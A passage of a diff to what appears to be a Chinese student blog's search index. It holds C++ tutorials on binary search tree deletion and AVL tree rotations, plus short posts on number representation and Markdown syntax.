class="type">void</span> <span class="title">CreateBST</span><span class="params">(BSTree &amp;T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	T=<span class="literal">NULL</span>;</span><br><span class="line">	ElemType e;</span><br><span class="line">	cin&gt;&gt;e;</span><br><span class="line">	<span class="keyword">while</span>(e!=ENDFLAG)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">InsertTree</span>(T,e);</span><br><span class="line">		cin&gt;&gt;e;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="删除">删除</h3>
-<p>删除就要分情况讨论，</p>
-<ol>
-<li>当待删除节点左子树为空时，其右子树子承父业代替其位置</li>
-<li>当待删除节点右子树为空时，其左子树子承父业代替其位置</li>
-<li>当待删除节点没有子节点，直接删除</li>
-<li>当待删除结点有两个非空子节点，一般是用<strong>左子树最大值和右子树最小值</strong>代替它，然后删除</li>
-</ol>
-<p>代码如下：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">DeleteBST</span><span class="params">(BSTree &amp;T,<span class="type">char</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//从二叉排序树T中删除关键字等于key的结点</span></span><br><span class="line">    BSTree p=T;BSTree f=<span class="literal">NULL</span>;</span><br><span class="line">    BSTree q;</span><br><span class="line">    BSTree s;</span><br><span class="line">    <span class="keyword">if</span>(!T) <span class="keyword">return</span>; <span class="comment">//树为空则返回</span></span><br><span class="line">    <span class="keyword">while</span>(p)<span class="comment">//查找</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data==key) <span class="keyword">break</span>;  <span class="comment">//找到关键字等于key的结点p，结束循环</span></span><br><span class="line">        f=p;                <span class="comment">//f为p的双亲</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;data&gt;key)</span><br><span class="line">            p=p-&gt;lchild; <span class="comment">//在p的左子树中继续查找</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p=p-&gt;rchild; <span class="comment">//在p的右子树中继续查找</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p) <span class="keyword">return</span>; <span class="comment">//找不到被删结点则返回</span></span><br><span class="line">    <span class="comment">//三种情况：p左右子树均不空、无右子树、无左子树</span></span><br><span class="line">    <span class="keyword">if</span>((p-&gt;lchild)&amp;&amp;(p-&gt;rchild))<span class="comment">//被删结点p左右子树均不空</span></span><br><span class="line">    &#123;</span><br><span class="line">        q=p;</span><br><span class="line">        s=p-&gt;lchild;</span><br><span class="line">        <span class="keyword">while</span>(s-&gt;rchild)<span class="comment">//在p的左子树中继续查找其前驱结点，即最右下结点</span></span><br><span class="line">        &#123;</span><br><span class="line">            q=s;</span><br><span class="line">            s=s-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">        p-&gt;data=s-&gt;data;  <span class="comment">//s的值赋值给被删结点p,然后删除s结点</span></span><br><span class="line">        <span class="keyword">if</span>(q!=p)</span><br><span class="line">            q-&gt;rchild=s-&gt;lchild; <span class="comment">//重接q的右子树</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            q-&gt;lchild=s-&gt;lchild; <span class="comment">//重接q的左子树</span></span><br><span class="line">        <span class="keyword">delete</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!p-&gt;rchild)<span class="comment">//被删结点p无右子树，只需重接其左子树</span></span><br><span class="line">        &#123;</span><br><span class="line">            q=p;</span><br><span class="line">            p=p-&gt;lchild;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!p-&gt;lchild)<span class="comment">//被删结点p无左子树，只需重接其右子树</span></span><br><span class="line">        &#123;</span><br><span class="line">             q=p;</span><br><span class="line">             p=p-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*――――――――――将p所指的子树挂接到其双亲结点f相应的位置――――――――*/</span></span><br><span class="line">        <span class="keyword">if</span>(!f)</span><br><span class="line">            T=p;  <span class="comment">//被删结点为根结点</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(q==f-&gt;lchild)</span><br><span class="line">                f-&gt;lchild=p; <span class="comment">//挂接到f的左子树位置</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                f-&gt;rchild=p;<span class="comment">//挂接到f的右子树位置</span></span><br><span class="line">        <span class="keyword">delete</span> q;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>删除的代码有点难以理解，最好是根据图像来理解，首先我们要清楚这里的f节点，p节点，q节点和s节点到底是什么，f节点是待删除节点的父亲节点，p节点是待删除节点，q节点是p节点的左子树的最右节点(有点逆天)，s节点是q节点的最右的值，图像如下：</p>
-<p><img src="https://s3.uuu.ovh/imgs/2022/11/27/363ec8d6850ffe48.png" alt=""></p>
-<p>通过这个图我们就可以看到删除的过程了，首先是找到s节点，它将是代替被删除节点的节点，当p节点被修改值之后就可以删除s节点了，当构建完q节点的右子树之后，p节点被删除，s节点取代p节点的位置，最后再修改f节点的指向即可。</p>
-<p>当然存在一种特殊情况：p的左子树里面没有右子树，这样的话p和q节点将代表了同一个节点，这时只需要将s替代掉p节点然后重接p节点的左子树即可。</p>
-<p><img src="https://s3.uuu.ovh/imgs/2022/11/27/740b7c1d4bcf290d.png" alt=""></p>
-<h2 id="平衡二叉树（AVL树）">平衡二叉树（AVL树）</h2>
-<h3 id="概念">概念</h3>
-<p>二叉搜索树的查找，插入，删除的时间复杂度均线性正比于二叉搜索树的高度，因此高度越小，效率越高。首先得明白平衡二叉树的定义，或者说平衡二叉树的一些性质：</p>
-<ul>
-<li>左右子树的高度差的绝对值不超过1</li>
-<li>左右子树也是平衡二叉树</li>
-</ul>
-<p>另外节点左右子树的高度差称为平衡因子。</p>
-<p>知道平衡二叉树的定义之后我们开始插入平衡二叉树，我们在这个二叉树当中插入20。</p>
-<p><img src="https://s3.uuu.ovh/imgs/2022/11/28/bac764c969739f01.png" alt=""></p>
-<p>插入后的二叉树如下，这时我们从新插入节点向上，找到最近的不平衡节点，即左右子树高度差值大于1，以该节点为根节点的树称为最小不平衡树，也就是说我们要将该不平衡树调整为平衡二叉树即可。</p>
-<p><img src="https://s3.uuu.ovh/imgs/2022/11/28/8c261c6f6751cf21.png" alt=""></p>
-<p>基本结构代码：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">AVLNode</span>&#123;</span><br><span class="line">   <span class="type">int</span> data;</span><br><span class="line">   <span class="type">int</span> height;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">AVLNode</span> *lchild;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">AVLNode</span> *rchild;</span><br><span class="line">&#125;*AVLTree;</span><br><span class="line"></span><br><span class="line"><span class="function">AVLTree <span class="title">Empty</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//删除树</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">Empty</span>(T-&gt;lchild);</span><br><span class="line">    <span class="built_in">Empty</span>(T-&gt;rchild);</span><br><span class="line">    <span class="keyword">delete</span> T;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">Height</span><span class="params">(AVLTree T)</span><span class="comment">//计算高度</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> T-&gt;height;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">updateHeight</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//更新高度</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     T-&gt;height=<span class="built_in">max</span>(<span class="built_in">Height</span>(T-&gt;lchild),<span class="built_in">Height</span>(T-&gt;rchild))+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="调整方法">调整方法</h3>
-<p>知道要做什么之后，就要了解如何平衡这个树。调整平衡可以分为4种情况：LL, RR, LR, RL。</p>
-<h4 id="LL旋转">LL旋转</h4>
-<p>LL型的意思就是最近不平衡节点A和插入节点C之间的路径是两个左子树，即A的左子树的左子树为C。方法是将A顺时针旋转代替B的右子树位置，这时$T_3$空闲出来，A节点没有左子树，将被抛弃的子树$T_3$拼接到A的左子树即可。</p>
-<p><img src="https://s3.uuu.ovh/imgs/2022/11/28/cc1bf19f534ecfc5.png" alt=""></p>
-<p>代码：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">AVLTree <span class="title">LL_Rotation</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//LL旋转</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    AVLTree temp=T-&gt;lchild;<span class="comment">//temp节点是B节点</span></span><br><span class="line">    T-&gt;lchild=temp-&gt;rchild;<span class="comment">//T3节点接到A节点的左子树</span></span><br><span class="line">    temp-&gt;rchild=T;<span class="comment">//A节点接到B节点的右子树</span></span><br><span class="line">    <span class="built_in">updateHeight</span>(T);<span class="comment">//更新高度</span></span><br><span class="line">    <span class="built_in">updateHeight</span>(temp);</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="RR旋转">RR旋转</h4>
-<p>RR型的概念理解如上，旋转方法是将A逆时针旋转取代B的左子树位置，将被抛弃的子树$T_2$放到A的右子树。</p>
-<p><img src="https://s3.uuu.ovh/imgs/2022/11/28/bbb0eafce90fe8f4.png" alt=""></p>
-<p>代码：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">AVLTree <span class="title">RR_Rotation</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//RR旋转</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    AVLTree temp=T-&gt;rchild;</span><br><span class="line">    T-&gt;rchild=temp-&gt;lchild;</span><br><span class="line">    temp-&gt;lchild=T;</span><br><span class="line">    <span class="built_in">updateHeight</span>(T);<span class="comment">//更新高度</span></span><br><span class="line">    <span class="built_in">updateHeight</span>(temp);</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="LR旋转">LR旋转</h4>
-<p>LR旋转需要分两次旋转，首先是将B做RR型旋转，后将A做LL型旋转。注意一下这里图因为方便看是移动了C节点，但实际上就是移动B到C下面并将C左子树拼接到B右子树。</p>
-<p><img src="https://s3.uuu.ovh/imgs/2022/11/28/7d7fc1ddd22ec9aa.png" alt=""></p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">AVLTree <span class="title">LR_Rotation</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//LR旋转</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     T-&gt;lchild=<span class="built_in">RR_Rotation</span>(T-&gt;lchild);</span><br><span class="line">     <span class="keyword">return</span> <span class="built_in">LL_Rotation</span>(T);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="RL旋转">RL旋转</h4>
-<p>分两次旋转，B做L旋转，然后A再做R旋转。</p>
-<p><img src="https://s3.uuu.ovh/imgs/2022/11/28/b1f9a9f7d4ae58a9.png" alt=""></p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">AVLTree <span class="title">RL_Rotation</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//RL旋转</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    T-&gt;rchild=<span class="built_in">LL_Rotation</span>(T-&gt;rchild);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">RR_Rotation</span>(T);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="算法步骤">算法步骤</h3>
-<ol>
-<li>在平衡二叉树中寻找x，如果查找失败，执行插入操作</li>
-<li>创建一个新节点p存储x，该节点双亲节点为f，高度为1。</li>
-<li>从双亲节点f出发，向上寻找最近的不平衡节点，逐层检查，如平衡更新高度，不平衡则判断类型并调整平衡。</li>
-</ol>
-<p>插入节点代码：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">AVLTree <span class="title">Insert</span><span class="params">(AVLTree &amp;T,<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="comment">//如果为空，创建新结点</span></span><br><span class="line">    &#123;</span><br><span class="line">        T=<span class="keyword">new</span> AVLNode;</span><br><span class="line">        T-&gt;lchild=T-&gt;rchild=<span class="literal">NULL</span>;</span><br><span class="line">        T-&gt;data=x;</span><br><span class="line">        T-&gt;height=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> T;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">if</span>(T-&gt;data==x) <span class="keyword">return</span> T;<span class="comment">//查找成功，什么也不做，查找失败时才插入</span></span><br><span class="line">    <span class="keyword">if</span>(x&lt;T-&gt;data)<span class="comment">//插入到左子树</span></span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;lchild=<span class="built_in">Insert</span>(T-&gt;lchild,x);<span class="comment">//注意插入后饭后结果挂接到T-&gt;lchild</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">Height</span>(T-&gt;lchild)-<span class="built_in">Height</span>(T-&gt;rchild)==<span class="number">2</span>)<span class="comment">//插入后看是否平衡，如果不平衡显然是插入的那一边高度大</span></span><br><span class="line">        &#123;                                         <span class="comment">//沿着高度大的那条路径判断</span></span><br><span class="line">            <span class="keyword">if</span>(x&lt;T-&gt;lchild-&gt;data)<span class="comment">//判断是LL还是LR,即插入的是lchild节点的lchild 还是rchild</span></span><br><span class="line">                T=<span class="built_in">LL_Rotation</span>(T);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                T=<span class="built_in">LR_Rotation</span>(T);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//插入到右子树</span></span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;rchild=<span class="built_in">Insert</span>(T-&gt;rchild,x);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">Height</span>(T-&gt;rchild)-<span class="built_in">Height</span>(T-&gt;lchild)==<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(x&gt;T-&gt;rchild-&gt;data)</span><br><span class="line">                T=<span class="built_in">RR_Rotation</span>(T);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                T=<span class="built_in">RL_Rotation</span>(T);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">updateHeight</span>(T);</span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>删除节点代码：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">AVLTree <span class="title">adjust</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//删除结点后，需要判断是否还是平衡，如果不平衡，就要调整</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">Height</span>(T-&gt;lchild)-<span class="built_in">Height</span>(T-&gt;rchild)==<span class="number">2</span>)<span class="comment">//沿着高度大的那条路径判断</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">Height</span>(T-&gt;lchild-&gt;lchild)&gt;=<span class="built_in">Height</span>(T-&gt;lchild-&gt;rchild))</span><br><span class="line">            T=<span class="built_in">LL_Rotation</span>(T);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            T=<span class="built_in">LR_Rotation</span>(T);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">Height</span>(T-&gt;rchild)-<span class="built_in">Height</span>(T-&gt;lchild)==<span class="number">2</span>)<span class="comment">//沿着高度大的那条路径判断</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">Height</span>(T-&gt;rchild-&gt;rchild)&gt;=<span class="built_in">Height</span>(T-&gt;rchild-&gt;lchild))</span><br><span class="line">            T=<span class="built_in">RR_Rotation</span>(T);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            T=<span class="built_in">RL_Rotation</span>(T);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">updateHeight</span>(T);</span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">AVLTree <span class="title">Delete</span><span class="params">(AVLTree &amp;T,<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(T-&gt;data==x)<span class="comment">//如果找到删除节点</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(T-&gt;rchild==<span class="literal">NULL</span>)<span class="comment">//如果该节点的右孩子为NULL,那么直接删除</span></span><br><span class="line">        &#123;</span><br><span class="line">            AVLTree temp=T;</span><br><span class="line">            T=T-&gt;lchild;</span><br><span class="line">            <span class="keyword">delete</span> temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//否则，将其右子树的最左孩子作为这个节点，并且递归删除这个节点的值</span></span><br><span class="line">        &#123;</span><br><span class="line">           AVLTree temp;</span><br><span class="line">           temp=T-&gt;rchild;</span><br><span class="line">           <span class="keyword">while</span>(temp-&gt;lchild)</span><br><span class="line">              temp=temp-&gt;lchild;</span><br><span class="line">           T-&gt;data=temp-&gt;data;</span><br><span class="line">           T-&gt;rchild=<span class="built_in">Delete</span>(T-&gt;rchild,T-&gt;data);</span><br><span class="line">           <span class="built_in">updateHeight</span>(T);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> T;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(T-&gt;data&gt;x)<span class="comment">//调节删除节点后可能涉及的节点</span></span><br><span class="line">        T-&gt;lchild=<span class="built_in">Delete</span>(T-&gt;lchild,x);</span><br><span class="line">    <span class="keyword">if</span>(T-&gt;data&lt;x)</span><br><span class="line">        T-&gt;rchild=<span class="built_in">Delete</span>(T-&gt;rchild,x);</span><br><span class="line">    <span class="built_in">updateHeight</span>(T);</span><br><span class="line">	T=<span class="built_in">adjust</span>(T);</span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>C++</tag>
-        <tag>算法</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>记录软院2022年1024解谜</title>
     <url>/2022/11/08/%E8%AE%B0%E5%BD%95%E8%BD%AF%E9%99%A22022%E5%B9%B41024%E8%A7%A3%E8%B0%9C/</url>
     <content><![CDATA[<p>首先是为什么写这篇文章，emmm，就当作是打了一次ctf写的wp吧，写都写了不如就发了(雾</p>
@@ -994,6 +977,114 @@
 <p>梅开二度，盲水印x2得到答案。</p>
 <p>结束！下班！来自一个啥也没干却很累的菜狗的碎碎念…</p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>计算机体系结构复习</title>
+    <url>/2022/06/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
+    <content><![CDATA[<p>大一下预习计算机体系结构</p>
+<span id="more"></span>
+<h4 id="原码反码补码">原码反码补码</h4>
+<ul>
+<li>原码：二进制形式</li>
+<li>反码：原码除符号位不变，其余全部取反</li>
+<li>补码：反码加一 ($a-b$的意思是a加上b的补码)</li>
+</ul>
+<p>减法器可以用一个加法器，一个非门，一个VDD组合构成。</p>
+]]></content>
+      <categories>
+        <category>大一课程</category>
+      </categories>
+      <tags>
+        <tag>计算机原理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>markdown基本语法使用</title>
+    <url>/2022/06/15/%E8%BF%99%E6%98%AF%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<p>这里是第一篇博客，不知道写些啥，那就浅浅的写一下markdown的基本语法叭</p>
+<span id="more"></span>
+<h1>1.粗体和斜体</h1>
+<h1>语法：</h1>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.*斜体* or _斜体_</span><br><span class="line">2.**粗体**</span><br><span class="line">3.***加粗斜体***</span><br><span class="line">4.~~删除线~~</span><br></pre></td></tr></table></figure>
+<p>显示效果：</p>
+<ol>
+<li><em>这是一段斜体</em></li>
+<li><strong>这是一段粗体</strong></li>
+<li><em><strong>这是一段加粗斜体</strong></em></li>
+<li><s>这是一段删除线</s></li>
+</ol>
+<h1>2.分级标题</h1>
+<p>语法:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.#一级标题</span><br><span class="line">2.##二级标题</span><br><span class="line">3.###三级标题</span><br><span class="line">4.####四级标题</span><br><span class="line">5.#####五级标题</span><br><span class="line">6.######六级标题</span><br></pre></td></tr></table></figure>
+<p><strong>注意：</strong> 字号一次递减，一级最大。</p>
+<h1>3.超链接</h1>
+<h4 id="第一种">第一种</h4>
+<p>语法说明：[]里写链接文字，()里写链接地址，另外最后的双引号内属性表示鼠标悬停时给出的信息，可加可不加，要加的话记得补上空格。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.欢迎滚去[百度一下](https://www.baidu.com/ &quot;百度一下你就知道&quot;)</span><br><span class="line">2.欢迎滚去[百度一下](https://www.baidu.com/)</span><br></pre></td></tr></table></figure>
+<p>1.欢迎滚去<a href="https://www.baidu.com/" title="百度一下你就知道">百度一下</a></p>
+<p>2.欢迎滚去<a href="https://www.baidu.com/">百度一下</a></p>
+<h4 id="第二种">第二种</h4>
+<p>在第一种的基础上可以加上序号方便管理。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.你可以前往[百度][1],[洛谷][2]等地方学习</span><br><span class="line">2.[1]:https://www.baidu.com/ &quot;百度&quot;</span><br><span class="line">3.[2]:https://www.luogu.com.cn/ &quot;洛谷&quot;</span><br></pre></td></tr></table></figure>
+<p>你可以前往<a href="https://www.baidu.com/" title="百度">百度</a>,<a href="https://www.luogu.com.cn/" title="洛谷">洛谷</a>等地方学习</p>
+<h4 id="第三种">第三种</h4>
+<p>这种是直接贴出来的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;链接地址&gt;</span><br></pre></td></tr></table></figure>
+<p><a href="https://www.baidu.com/">https://www.baidu.com/</a></p>
+<h1>列表</h1>
+<p><strong>无序列表的表示</strong></p>
+<p>使用*，+，- 表示无序列表</p>
+<p>语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.- 无序列表一</span><br><span class="line">2.- 无序列表二</span><br><span class="line">3.- 无序列表三</span><br></pre></td></tr></table></figure>
+<p>显示效果：</p>
+<ul>
+<li>无序列表一</li>
+<li>无序列表二</li>
+<li>无序列表三</li>
+</ul>
+<p><strong>有序列表的表示</strong></p>
+<p>直接用一个数字和英文句点就行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. balabala</span><br><span class="line">2. balabala</span><br><span class="line">3. balabala</span><br></pre></td></tr></table></figure>
+<p>显示效果：</p>
+<ol>
+<li>有序列表一</li>
+<li>有序列表二</li>
+<li>有序列表三</li>
+</ol>
+<h5 id="包含引用（虽然我感觉没啥用2333）">包含引用（虽然我感觉没啥用2333）</h5>
+<p>语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 阅读的方法</span><br><span class="line">	&gt; 打开电灯</span><br><span class="line">	&gt; 打开书本</span><br></pre></td></tr></table></figure>
+<p>效果：</p>
+<ul>
+<li>
+<p>阅读的方法</p>
+<blockquote>
+<p>打开电灯<br>
+打开书本</p>
+</blockquote>
+</li>
+</ul>
+<h5 id="特殊情况">特殊情况</h5>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.1986\. what a  great season.(正确)</span><br><span class="line">2.1986. what a  great season.(错误)</span><br></pre></td></tr></table></figure>
+<p>emmm,自己注意一下</p>
+<ol>
+<li>1986. what a  great season.</li>
+</ol>
+<h1>公式</h1>
+<p>语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">质能守恒方程可以用$E=mc^2$来表达</span><br></pre></td></tr></table></figure>
+<p>效果：$E=mc^2$</p>
+<p>数学符号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尖括号:\langle</span><br><span class="line">上取整:\lceil</span><br><span class="line">下取整:\lfloor</span><br><span class="line">分数:\frac&#123;分子&#125;&#123;分母&#125;</span><br><span class="line">求和:\sum</span><br><span class="line">积分:\int_&#123;下限&#125;^&#123;\infty&#125;后面的括号表示上限，\infty表示无限</span><br><span class="line">极限:\lim_&#123;x\to+\infty&#125;</span><br></pre></td></tr></table></figure>
+<p>极限的效果：$\lim_{x\to +\infty}$</p>
+]]></content>
+      <categories>
+        <category>博客</category>
+      </categories>
+      <tags>
+        <tag>语法</tag>
+        <tag>markdown</tag>
+      </tags>
   </entry>
   <entry>
     <title>项目管理实施流程</title>
@@ -1215,94 +1306,6 @@
       <tags>
         <tag>项目管理</tag>
         <tag>项目流程</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>markdown基本语法使用</title>
-    <url>/2022/06/15/%E8%BF%99%E6%98%AF%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<p>这里是第一篇博客，不知道写些啥，那就浅浅的写一下markdown的基本语法叭</p>
-<span id="more"></span>
-<h1>1.粗体和斜体</h1>
-<h1>语法：</h1>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.*斜体* or _斜体_</span><br><span class="line">2.**粗体**</span><br><span class="line">3.***加粗斜体***</span><br><span class="line">4.~~删除线~~</span><br></pre></td></tr></table></figure>
-<p>显示效果：</p>
-<ol>
-<li><em>这是一段斜体</em></li>
-<li><strong>这是一段粗体</strong></li>
-<li><em><strong>这是一段加粗斜体</strong></em></li>
-<li><s>这是一段删除线</s></li>
-</ol>
-<h1>2.分级标题</h1>
-<p>语法:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.#一级标题</span><br><span class="line">2.##二级标题</span><br><span class="line">3.###三级标题</span><br><span class="line">4.####四级标题</span><br><span class="line">5.#####五级标题</span><br><span class="line">6.######六级标题</span><br></pre></td></tr></table></figure>
-<p><strong>注意：</strong> 字号一次递减，一级最大。</p>
-<h1>3.超链接</h1>
-<h4 id="第一种">第一种</h4>
-<p>语法说明：[]里写链接文字，()里写链接地址，另外最后的双引号内属性表示鼠标悬停时给出的信息，可加可不加，要加的话记得补上空格。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.欢迎滚去[百度一下](https://www.baidu.com/ &quot;百度一下你就知道&quot;)</span><br><span class="line">2.欢迎滚去[百度一下](https://www.baidu.com/)</span><br></pre></td></tr></table></figure>
-<p>1.欢迎滚去<a href="https://www.baidu.com/" title="百度一下你就知道">百度一下</a></p>
-<p>2.欢迎滚去<a href="https://www.baidu.com/">百度一下</a></p>
-<h4 id="第二种">第二种</h4>
-<p>在第一种的基础上可以加上序号方便管理。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.你可以前往[百度][1],[洛谷][2]等地方学习</span><br><span class="line">2.[1]:https://www.baidu.com/ &quot;百度&quot;</span><br><span class="line">3.[2]:https://www.luogu.com.cn/ &quot;洛谷&quot;</span><br></pre></td></tr></table></figure>
-<p>你可以前往<a href="https://www.baidu.com/" title="百度">百度</a>,<a href="https://www.luogu.com.cn/" title="洛谷">洛谷</a>等地方学习</p>
-<h4 id="第三种">第三种</h4>
-<p>这种是直接贴出来的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;链接地址&gt;</span><br></pre></td></tr></table></figure>
-<p><a href="https://www.baidu.com/">https://www.baidu.com/</a></p>
-<h1>列表</h1>
-<p><strong>无序列表的表示</strong></p>
-<p>使用*，+，- 表示无序列表</p>
-<p>语法：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.- 无序列表一</span><br><span class="line">2.- 无序列表二</span><br><span class="line">3.- 无序列表三</span><br></pre></td></tr></table></figure>
-<p>显示效果：</p>
-<ul>
-<li>无序列表一</li>
-<li>无序列表二</li>
-<li>无序列表三</li>
-</ul>
